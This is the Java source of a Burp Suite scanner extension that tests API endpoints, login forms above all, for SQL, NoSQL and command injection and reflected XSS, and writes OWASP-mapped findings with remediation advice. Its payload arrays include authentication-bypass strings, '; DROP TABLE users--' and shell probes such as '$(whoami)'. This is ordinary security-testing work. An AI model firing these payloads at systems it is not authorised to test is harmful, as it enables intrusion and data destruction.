package com.security.burp.checks;

import burp.*;
import com.google.gson.*;
import com.security.burp.model.CustomScanIssue;
import java.io.PrintWriter;
import java.util.*;

/**
 * Injection Vulnerability Check
 * OWASP API2:2023 - Broken Authentication (SQL Injection)
 * OWASP API8:2023 - Security Misconfiguration
 * Tests for various injection attacks (SQL, NoSQL, Command, XSS)
 */
public class InjectionCheck {

    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private final PrintWriter stdout;
    private final Gson gson;

    // SQL Injection payloads - expanded for authentication bypass
    private static final String[] SQL_PAYLOADS = {
        "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1' --",
        "' UNION SELECT NULL--", "'; DROP TABLE users--",
        "\" OR \"1\"=\"1", "admin' --", "admin' #",
        "' OR 'a'='a", "') OR ('1'='1"
    };

    // NoSQL Injection payloads
    private static final String[] NOSQL_PAYLOADS = {
        "{\"$gt\":\"\"}", "{\"$ne\":null}", "{\"$ne\":\"\"}"
    };

    // Command Injection payloads
    private static final String[] CMD_PAYLOADS = {
        "; ls", "| whoami", "`whoami`", "$(whoami)", "&& dir"
    };

    // XSS payloads for APIs
    private static final String[] XSS_PAYLOADS = {
        "<script>alert(1)</script>", "\"><script>alert(1)</script>",
        "javascript:alert(1)", "<img src=x onerror=alert(1)>"
    };

    // Error patterns that indicate vulnerabilities
    private static final String[] SQL_ERROR_PATTERNS = {
        "sql syntax", "mysql", "postgresql", "ora-", "sqlite",
        "unclosed quotation", "syntax error"
    };

    private static final String[] NOSQL_ERROR_PATTERNS = {
        "mongodb", "mongo", "castError", "ValidationError"
    };

    public InjectionCheck(IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers,
                         PrintWriter stdout) {
        this.callbacks = callbacks;
        this.helpers = helpers;
        this.stdout = stdout;
        this.gson = new Gson();
    }

    public List<IScanIssue> checkInjections(IHttpRequestResponse baseRequestResponse,
                                           IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
            String path = requestInfo.getUrl().getPath().toLowerCase();

            // Check if this is an authentication endpoint
            if (isAuthenticationEndpoint(path) && requestInfo.getMethod().equals("POST")) {
                stdout.println("[Injection Check] ⚡ Detected authentication endpoint - running targeted SQL injection tests");
                issues.addAll(testAuthenticationSQLInjection(baseRequestResponse));
                if (!issues.isEmpty()) {
                    return issues; // Found critical auth bypass, return immediately
                }
            }

            stdout.println("[Injection Check] Testing insertion point: " + insertionPoint.getInsertionPointName());

            // Test SQL Injection
            issues.addAll(testSQLInjection(baseRequestResponse, insertionPoint));

            // Test NoSQL Injection
            issues.addAll(testNoSQLInjection(baseRequestResponse, insertionPoint));

            // Test Command Injection
            issues.addAll(testCommandInjection(baseRequestResponse, insertionPoint));

            // Test XSS (reflected in API responses)
            issues.addAll(testXSS(baseRequestResponse, insertionPoint));

        } catch (Exception e) {
            stdout.println("[Injection Check] Error: " + e.getMessage());
        }

        return issues;
    }

    /**
     * Specialized test for SQL injection in authentication endpoints
     * This targets API2:2023 - Broken Authentication
     */
    public List<IScanIssue> testAuthenticationSQLInjection(IHttpRequestResponse baseRequestResponse) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
            byte[] request = baseRequestResponse.getRequest();
            int bodyOffset = requestInfo.getBodyOffset();

            if (bodyOffset >= request.length) {
                return issues;
            }

            String originalBody = new String(Arrays.copyOfRange(request, bodyOffset, request.length));
            stdout.println("[Injection Check] Authentication endpoint body: " + originalBody);

            // Try to parse as JSON
            try {
                JsonElement jsonElement = JsonParser.parseString(originalBody);
                if (!jsonElement.isJsonObject()) {
                    return issues;
                }

                JsonObject originalJson = jsonElement.getAsJsonObject();

                // Find username/password fields
                String[] usernameFields = {"username", "user", "email", "login", "account"};
                String[] passwordFields = {"password", "pass", "pwd", "secret", "credentials"};

                String usernameField = null;
                String passwordField = null;

                for (String field : usernameFields) {
                    if (originalJson.has(field)) {
                        usernameField = field;
                        break;
                    }
                }

                for (String field : passwordFields) {
                    if (originalJson.has(field)) {
                        passwordField = field;
                        break;
                    }
                }

                if (usernameField == null || passwordField == null) {
                    stdout.println("[Injection Check] Could not identify username/password fields");
                    return issues;
                }

                stdout.println("[Injection Check] Found auth fields: " + usernameField + "/" + passwordField);

                // Test SQL injection in password field
                for (String sqlPayload : SQL_PAYLOADS) {
                    JsonObject attackJson = originalJson.deepCopy();
                    attackJson.addProperty(usernameField, "admin");
                    attackJson.addProperty(passwordField, sqlPayload);

                    byte[] attackRequest = buildRequestWithJson(baseRequestResponse, attackJson.toString());
                    IHttpRequestResponse attackResponse = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(), attackRequest);

                    if (attackResponse.getResponse() != null) {
                        IResponseInfo responseInfo = helpers.analyzeResponse(attackResponse.getResponse());
                        int statusCode = responseInfo.getStatusCode();
                        String responseBody = getResponseBody(attackResponse.getResponse(), responseInfo).toLowerCase();

                        stdout.println("[Injection Check] SQL payload test: '" + sqlPayload + "' => " + statusCode);

                        // Check for successful authentication bypass
                        if (statusCode == 200 && (responseBody.contains("token") ||
                                                  responseBody.contains("\"success\":true") ||
                                                  responseBody.contains("\"user\"") ||
                                                  responseBody.contains("logged") ||
                                                  responseBody.contains("authenticated"))) {
                            stdout.println("[Injection Check] 🚨 CRITICAL: SQL INJECTION AUTHENTICATION BYPASS!");
                            issues.add(createAuthBypassIssue(baseRequestResponse, attackResponse,
                                      passwordField, sqlPayload, responseBody));
                            return issues;
                        }

                        // Check for SQL error messages
                        if (responseBody.contains("sql") || responseBody.contains("syntax") ||
                            responseBody.contains("mysql") || responseBody.contains("sqlite") ||
                            responseBody.contains("postgres") || responseBody.contains("query")) {
                            stdout.println("[Injection Check] 🚨 SQL ERROR MESSAGE DETECTED!");
                            issues.add(createSQLErrorAuthIssue(baseRequestResponse, attackResponse,
                                      passwordField, sqlPayload, responseBody));
                            return issues;
                        }
                    }
                }

                // Also test SQL injection in username field
                for (String sqlPayload : SQL_PAYLOADS) {
                    JsonObject attackJson = originalJson.deepCopy();
                    attackJson.addProperty(usernameField, sqlPayload);
                    attackJson.addProperty(passwordField, "password");

                    byte[] attackRequest = buildRequestWithJson(baseRequestResponse, attackJson.toString());
                    IHttpRequestResponse attackResponse = callbacks.makeHttpRequest(
                        baseRequestResponse.getHttpService(), attackRequest);

                    if (attackResponse.getResponse() != null) {
                        IResponseInfo responseInfo = helpers.analyzeResponse(attackResponse.getResponse());
                        int statusCode = responseInfo.getStatusCode();
                        String responseBody = getResponseBody(attackResponse.getResponse(), responseInfo).toLowerCase();

                        if (statusCode == 200 && (responseBody.contains("token") ||
                                                  responseBody.contains("success"))) {
                            stdout.println("[Injection Check] 🚨 CRITICAL: SQL INJECTION IN USERNAME FIELD!");
                            issues.add(createAuthBypassIssue(baseRequestResponse, attackResponse,
                                      usernameField, sqlPayload, responseBody));
                            return issues;
                        }
                    }
                }

            } catch (JsonSyntaxException e) {
                stdout.println("[Injection Check] Not JSON body, skipping auth SQL injection test");
            }

        } catch (Exception e) {
            stdout.println("[Injection Check] Auth SQL injection test error: " + e.getMessage());
            e.printStackTrace(new PrintWriter(callbacks.getStderr(), true));
        }

        return issues;
    }

    private boolean isAuthenticationEndpoint(String path) {
        return path.contains("/login") ||
               path.contains("/auth") ||
               path.contains("/signin") ||
               path.contains("/authenticate") ||
               path.contains("/token");
    }

    private byte[] buildRequestWithJson(IHttpRequestResponse baseRequestResponse, String jsonBody) {
        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        List<String> headers = new ArrayList<>(requestInfo.getHeaders());

        // Update Content-Length
        List<String> newHeaders = new ArrayList<>();
        for (String header : headers) {
            if (!header.toLowerCase().startsWith("content-length:")) {
                newHeaders.add(header);
            }
        }
        newHeaders.add("Content-Length: " + jsonBody.getBytes().length);

        return helpers.buildHttpMessage(newHeaders, jsonBody.getBytes());
    }

    private List<IScanIssue> testSQLInjection(IHttpRequestResponse baseRequestResponse,
                                              IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            for (String payload : SQL_PAYLOADS) {
                byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

                IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

                if (checkResponse.getResponse() != null) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(checkResponse.getResponse());
                    String responseBody = getResponseBody(checkResponse.getResponse(), responseInfo).toLowerCase();

                    // Check for SQL error messages
                    for (String errorPattern : SQL_ERROR_PATTERNS) {
                        if (responseBody.contains(errorPattern)) {
                            stdout.println("[Injection Check] ⚠️  SQL Injection vulnerability found!");
                            issues.add(createSQLInjectionIssue(baseRequestResponse, checkResponse,
                                      insertionPoint, payload, errorPattern));
                            return issues; // One finding is enough
                        }
                    }

                    // Check for timing-based detection (different response time)
                    // This is a simplified check - would need more sophisticated timing analysis
                }
            }
        } catch (Exception e) {
            stdout.println("[Injection Check] SQL test error: " + e.getMessage());
        }

        return issues;
    }

    private List<IScanIssue> testNoSQLInjection(IHttpRequestResponse baseRequestResponse,
                                                IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
            String contentType = getContentType(requestInfo.getHeaders());

            // NoSQL injection primarily affects JSON endpoints
            if (contentType == null || !contentType.contains("application/json")) {
                return issues;
            }

            for (String payload : NOSQL_PAYLOADS) {
                byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

                IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

                if (checkResponse.getResponse() != null) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(checkResponse.getResponse());
                    String responseBody = getResponseBody(checkResponse.getResponse(), responseInfo).toLowerCase();
                    int statusCode = responseInfo.getStatusCode();

                    // Check for NoSQL error messages
                    for (String errorPattern : NOSQL_ERROR_PATTERNS) {
                        if (responseBody.contains(errorPattern)) {
                            stdout.println("[Injection Check] ⚠️  NoSQL Injection vulnerability found!");
                            issues.add(createNoSQLInjectionIssue(baseRequestResponse, checkResponse,
                                      insertionPoint, payload, errorPattern));
                            return issues;
                        }
                    }

                    // Check for bypass behavior (200 when should be auth error)
                    if (statusCode == 200 && payload.contains("$ne")) {
                        // This might indicate authentication bypass
                        issues.add(createNoSQLInjectionIssue(baseRequestResponse, checkResponse,
                                  insertionPoint, payload, "potential bypass"));
                    }
                }
            }
        } catch (Exception e) {
            stdout.println("[Injection Check] NoSQL test error: " + e.getMessage());
        }

        return issues;
    }

    private List<IScanIssue> testCommandInjection(IHttpRequestResponse baseRequestResponse,
                                                  IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            for (String payload : CMD_PAYLOADS) {
                byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

                IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

                if (checkResponse.getResponse() != null) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(checkResponse.getResponse());
                    String responseBody = getResponseBody(checkResponse.getResponse(), responseInfo);

                    // Look for command output patterns
                    if (responseBody.contains("root:") || responseBody.contains("/bin/") ||
                        responseBody.contains("Windows") || responseBody.contains("Administrator")) {
                        stdout.println("[Injection Check] ⚠️  Command Injection vulnerability found!");
                        issues.add(createCommandInjectionIssue(baseRequestResponse, checkResponse,
                                  insertionPoint, payload));
                        return issues;
                    }

                    // Check for error messages indicating command execution attempt
                    if (responseBody.toLowerCase().contains("command not found") ||
                        responseBody.toLowerCase().contains("is not recognized")) {
                        stdout.println("[Injection Check] ⚠️  Command Injection attempted!");
                        issues.add(createCommandInjectionIssue(baseRequestResponse, checkResponse,
                                  insertionPoint, payload));
                        return issues;
                    }
                }
            }
        } catch (Exception e) {
            stdout.println("[Injection Check] Command injection test error: " + e.getMessage());
        }

        return issues;
    }

    private List<IScanIssue> testXSS(IHttpRequestResponse baseRequestResponse,
                                     IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        try {
            for (String payload : XSS_PAYLOADS) {
                byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

                IHttpRequestResponse checkResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

                if (checkResponse.getResponse() != null) {
                    IResponseInfo responseInfo = helpers.analyzeResponse(checkResponse.getResponse());
                    String responseBody = getResponseBody(checkResponse.getResponse(), responseInfo);

                    // Check if payload is reflected unencoded
                    if (responseBody.contains(payload)) {
                        stdout.println("[Injection Check] ⚠️  Reflected XSS in API response!");
                        issues.add(createXSSIssue(baseRequestResponse, checkResponse,
                                  insertionPoint, payload));
                        return issues;
                    }
                }
            }
        } catch (Exception e) {
            stdout.println("[Injection Check] XSS test error: " + e.getMessage());
        }

        return issues;
    }

    private String getResponseBody(byte[] response, IResponseInfo responseInfo) {
        int bodyOffset = responseInfo.getBodyOffset();
        if (bodyOffset < response.length) {
            return new String(Arrays.copyOfRange(response, bodyOffset, response.length));
        }
        return "";
    }

    private String getContentType(List<String> headers) {
        for (String header : headers) {
            if (header.toLowerCase().startsWith("content-type:")) {
                return header.substring(13).trim().toLowerCase();
            }
        }
        return null;
    }

    private IScanIssue createSQLInjectionIssue(IHttpRequestResponse original,
                                               IHttpRequestResponse attack,
                                               IScannerInsertionPoint insertionPoint,
                                               String payload, String errorPattern) {
        String issueName = "API2:2023 - Broken Authentication (SQL Injection)";
        String issueDetail = "<b>SQL Injection Vulnerability Detected</b><br><br>" +
                           "<b>Insertion Point:</b> " + insertionPoint.getInsertionPointName() + "<br>" +
                           "<b>Payload:</b> <code>" + helpers.urlEncode(payload) + "</code><br>" +
                           "<b>Error Pattern Found:</b> " + errorPattern + "<br><br>" +
                           "<b>Impact:</b><br>" +
                           "• Unauthorized data access and exfiltration<br>" +
                           "• Data modification or deletion<br>" +
                           "• Authentication bypass (if in auth endpoints)<br>" +
                           "• Complete database compromise<br>" +
                           "• Privilege escalation<br><br>" +
                           "<b>Remediation:</b><br>" +
                           "• Use parameterized queries (prepared statements)<br>" +
                           "• Never concatenate user input into SQL queries<br>" +
                           "• Use ORM frameworks with proper escaping<br>" +
                           "• Implement input validation and sanitization";

        String issueBackground = "API2:2023 - Broken Authentication<br><br>" +
                               "Authentication mechanisms are often implemented incorrectly, allowing attackers to " +
                               "compromise authentication tokens or exploit implementation flaws. SQL injection in API " +
                               "parameters can lead to authentication bypass and unauthorized access.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "Critical",
            "Firm"
        );
    }

    private IScanIssue createNoSQLInjectionIssue(IHttpRequestResponse original,
                                                 IHttpRequestResponse attack,
                                                 IScannerInsertionPoint insertionPoint,
                                                 String payload, String indicator) {
        String issueName = "API2:2023 - Broken Authentication (NoSQL Injection)";
        String issueDetail = "<b>NoSQL Injection Vulnerability Detected</b><br><br>" +
                           "<b>Insertion Point:</b> " + insertionPoint.getInsertionPointName() + "<br>" +
                           "<b>Payload:</b> <code>" + payload + "</code><br>" +
                           "<b>Indicator:</b> " + indicator + "<br><br>" +
                           "<b>Impact:</b><br>" +
                           "• Authentication bypass<br>" +
                           "• Unauthorized data extraction<br>" +
                           "• Denial of service attacks<br>" +
                           "• Query manipulation<br>" +
                           "• Potential code execution (in some MongoDB configurations)<br><br>" +
                           "<b>Remediation:</b><br>" +
                           "• Validate and sanitize all user input<br>" +
                           "• Use parameterized queries or ORM methods<br>" +
                           "• Avoid using $where operator with user input<br>" +
                           "• Implement strict input type checking";

        String issueBackground = "API2:2023 - Broken Authentication<br><br>" +
                               "NoSQL databases like MongoDB are vulnerable to injection attacks when user input is " +
                               "not properly validated. NoSQL injection in authentication mechanisms can lead to " +
                               "complete authentication bypass and unauthorized access.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "Critical",
            "Firm"
        );
    }

    private IScanIssue createCommandInjectionIssue(IHttpRequestResponse original,
                                                   IHttpRequestResponse attack,
                                                   IScannerInsertionPoint insertionPoint,
                                                   String payload) {
        String issueName = "API8:2023 - Security Misconfiguration (OS Command Injection)";
        String issueDetail = "<b>🚨 CRITICAL: OS Command Injection Vulnerability Detected</b><br><br>" +
                           "<b>Insertion Point:</b> " + insertionPoint.getInsertionPointName() + "<br>" +
                           "<b>Payload:</b> <code>" + payload + "</code><br><br>" +
                           "<b>Impact:</b><br>" +
                           "• <b>Complete server compromise</b><br>" +
                           "• Arbitrary command execution with application privileges<br>" +
                           "• Data exfiltration and database access<br>" +
                           "• Lateral movement to other systems<br>" +
                           "• Denial of service<br>" +
                           "• Installation of backdoors and malware<br><br>" +
                           "<b>Remediation:</b><br>" +
                           "• <b>Never</b> pass user input to system commands<br>" +
                           "• Use language-specific APIs instead of shell commands<br>" +
                           "• If shell execution is unavoidable, use strict whitelisting<br>" +
                           "• Run application with minimal privileges<br>" +
                           "• Implement input validation and sanitization";

        String issueBackground = "API8:2023 - Security Misconfiguration<br><br>" +
                               "OS Command Injection occurs when an application passes unsafe user input to system " +
                               "shell commands. This is one of the most severe vulnerabilities as it allows complete " +
                               "server compromise. It falls under security misconfiguration because it represents a " +
                               "fundamental failure to properly handle untrusted input.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "Critical",
            "Certain"
        );
    }

    private IScanIssue createXSSIssue(IHttpRequestResponse original,
                                     IHttpRequestResponse attack,
                                     IScannerInsertionPoint insertionPoint,
                                     String payload) {
        String issueName = "API8:2023 - Security Misconfiguration (Reflected XSS in API Response)";
        String issueDetail = "<b>Reflected Cross-Site Scripting in API Response</b><br><br>" +
                           "<b>Insertion Point:</b> " + insertionPoint.getInsertionPointName() + "<br>" +
                           "<b>Payload:</b> <code>" + helpers.urlEncode(payload) + "</code><br><br>" +
                           "The API reflects user input without proper encoding, allowing XSS attacks.<br><br>" +
                           "<b>Impact:</b><br>" +
                           "• Session hijacking if API responses are rendered in browsers<br>" +
                           "• Credential theft<br>" +
                           "• Phishing attacks<br>" +
                           "• Client-side code execution<br><br>" +
                           "<b>Note:</b> While APIs typically return JSON, this data may be consumed by web " +
                           "applications that render it without proper encoding, leading to XSS vulnerabilities.<br><br>" +
                           "<b>Remediation:</b><br>" +
                           "• Encode all user-controlled data in API responses<br>" +
                           "• Use Content-Security-Policy headers<br>" +
                           "• Set Content-Type to application/json explicitly<br>" +
                           "• Implement input validation";

        String issueBackground = "API8:2023 - Security Misconfiguration<br><br>" +
                               "Reflecting user input without proper encoding represents a security misconfiguration. " +
                               "While XSS is traditionally a web application issue, APIs that reflect unencoded input " +
                               "create vulnerabilities in consuming applications.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "Medium",
            "Firm"
        );
    }

    private IScanIssue createAuthBypassIssue(IHttpRequestResponse original, IHttpRequestResponse attack,
                                            String field, String payload, String responseBody) {
        String issueName = "API2:2023 - Broken Authentication (SQL Injection Authentication Bypass)";
        String issueDetail = "<b>🚨 CRITICAL: SQL Injection Authentication Bypass Detected!</b><br><br>" +
                           "The authentication endpoint is vulnerable to SQL injection, allowing complete authentication bypass.<br><br>" +
                           "<b>Vulnerable Field:</b> " + field + "<br>" +
                           "<b>Payload Used:</b> <code>" + payload.replace("<", "&lt;").replace(">", "&gt;") + "</code><br>" +
                           "<b>Status Code:</b> 200 OK (Authentication Successful)<br><br>" +
                           "<b>Impact:</b><br>" +
                           "• Complete authentication bypass - no credentials needed<br>" +
                           "• Unauthorized access to any user account<br>" +
                           "• Potential database compromise and data exfiltration<br>" +
                           "• Privilege escalation to admin accounts<br>" +
                           "• Complete application takeover<br><br>" +
                           "<b>Response Evidence (first 500 chars):</b><br>" +
                           "<pre>" + responseBody.substring(0, Math.min(500, responseBody.length())).replace("<", "&lt;").replace(">", "&gt;") + "</pre><br>" +
                           "<b>Remediation:</b><br>" +
                           "• Use parameterized queries/prepared statements (NEVER string concatenation)<br>" +
                           "• Use ORM frameworks with proper escaping<br>" +
                           "• Implement input validation and sanitization<br>" +
                           "• Use stored procedures with parameters<br>" +
                           "• Apply principle of least privilege to database accounts";

        String issueBackground = "API2:2023 - Broken Authentication<br><br>" +
                               "Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise " +
                               "authentication tokens or to exploit implementation flaws to assume other users' identities " +
                               "temporarily or permanently. SQL Injection in authentication endpoints is one of the most " +
                               "critical vulnerabilities as it allows complete bypass of authentication controls.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "Critical",
            "Certain"
        );
    }

    private IScanIssue createSQLErrorAuthIssue(IHttpRequestResponse original, IHttpRequestResponse attack,
                                              String field, String payload, String responseBody) {
        String issueName = "API2:2023 - Broken Authentication (SQL Injection - Error-Based)";
        String issueDetail = "<b>SQL Injection Detected in Authentication Endpoint!</b><br><br>" +
                           "The authentication endpoint returns SQL error messages, confirming SQL injection vulnerability.<br><br>" +
                           "<b>Vulnerable Field:</b> " + field + "<br>" +
                           "<b>Payload Used:</b> <code>" + payload.replace("<", "&lt;").replace(">", "&gt;") + "</code><br><br>" +
                           "<b>SQL Error Evidence (first 500 chars):</b><br>" +
                           "<pre>" + responseBody.substring(0, Math.min(500, responseBody.length())).replace("<", "&lt;").replace(">", "&gt;") + "</pre><br>" +
                           "<b>Impact:</b><br>" +
                           "• Potential authentication bypass<br>" +
                           "• Database information disclosure<br>" +
                           "• Unauthorized data access<br>" +
                           "• Database structure enumeration<br><br>" +
                           "<b>Remediation:</b><br>" +
                           "• Use parameterized queries/prepared statements<br>" +
                           "• Implement generic error messages (don't expose SQL errors)<br>" +
                           "• Use proper input validation<br>" +
                           "• Implement rate limiting on login attempts";

        String issueBackground = "API2:2023 - Broken Authentication<br><br>" +
                               "SQL Injection in authentication endpoints can lead to authentication bypass and " +
                               "unauthorized access to the application. Exposing SQL error messages provides " +
                               "attackers with valuable information about the database structure.";

        return new CustomScanIssue(
            original.getHttpService(),
            helpers.analyzeRequest(original).getUrl(),
            new IHttpRequestResponse[]{original, attack},
            issueName,
            issueDetail,
            issueBackground,
            "High",
            "Certain"
        );
    }
}
